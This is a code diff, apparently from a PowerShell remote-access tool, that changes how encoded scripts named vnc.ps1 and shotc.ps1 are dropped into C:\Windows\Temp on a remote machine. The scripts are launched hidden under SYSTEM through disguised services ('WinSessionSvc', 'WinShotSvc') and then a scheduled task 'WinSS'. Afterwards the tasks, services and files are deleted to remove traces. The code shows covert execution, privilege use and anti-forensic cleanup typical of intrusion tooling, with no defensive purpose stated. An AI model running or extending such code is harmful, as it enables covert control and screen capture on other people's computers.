@@ -61,6 +61,7 @@ public class WTS {
         $vb64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($vncps))
 
         $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
+"try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
 "Set-Content -Path 'C:\Windows\Temp\vnc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$vb64'))) -Force`n" +
 "try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
 "} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
@@ -91,13 +92,16 @@ public class WTS {
         invoke-command -session $s -scriptblock {
             Param($et)
             Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
-            New-Service -Name 'WinSessionSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
-            Start-Service -Name 'WinSessionSvc' -ErrorAction SilentlyContinue
+            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
+            Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
+            Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
             Start-Sleep -Seconds 22
         } -ArgumentList $engine
         Start-Sleep -Seconds 18
         invoke-command -session $s -scriptblock {
-            sc.exe delete WinSessionSvc | Out-Null
+            Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
+            sc.exe stop WinShotSvc | Out-Null; sc.exe stop WinSessionSvc | Out-Null
+            sc.exe delete WinShotSvc | Out-Null; sc.exe delete WinSessionSvc | Out-Null
             Remove-Item 'C:\Windows\Temp\ss.ps1','C:\Windows\Temp\vnc.ps1' -Force -ErrorAction SilentlyContinue
             'SSLOG:'
             if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
@@ -121,6 +125,7 @@ public class WTS {
         $enc = [System.Convert]::ToBase64String($bytes)
 
         $engine = "function L { Param(`$m) Add-Content -Path 'C:\Windows\Temp\sslog.txt' -Value `$m }`n" +
+"try { L 'ENGINE STARTED' } catch { exit 1 }`n" +
 "Set-Content -Path 'C:\Windows\Temp\shotc.ps1' -Value ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$enc'))) -Force`n" +
 "try { Add-Type -TypeDefinition @'`n" + $cs + "`n'@`n" +
 "} catch { L (`"ADDTYPE: `" + `$_.Exception.Message) }`n" +
@@ -153,11 +158,11 @@ public class WTS {
             Param($et, $engineSb)
             Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
             Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
-            New-Service -Name 'WinShotSvc' -BinaryPathName 'powershell.exe -nop -w hidden -f C:\Windows\Temp\ss.ps1' -StartupType Manual -ErrorAction SilentlyContinue | Out-Null
-            Start-Service -Name 'WinShotSvc' -ErrorAction SilentlyContinue
+            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
+            Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
+            Start-ScheduledTask -TaskName 'WinSS' -ErrorAction SilentlyContinue
             Start-Sleep -Seconds 26
-            Stop-Service -Name 'WinShotSvc' -Force -ErrorAction SilentlyContinue
-            sc.exe delete WinShotSvc | Out-Null
+            Unregister-ScheduledTask -TaskName 'WinSS' -Confirm:$false -Force -ErrorAction SilentlyContinue
             'LOG:'
             if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
             'FILE:'
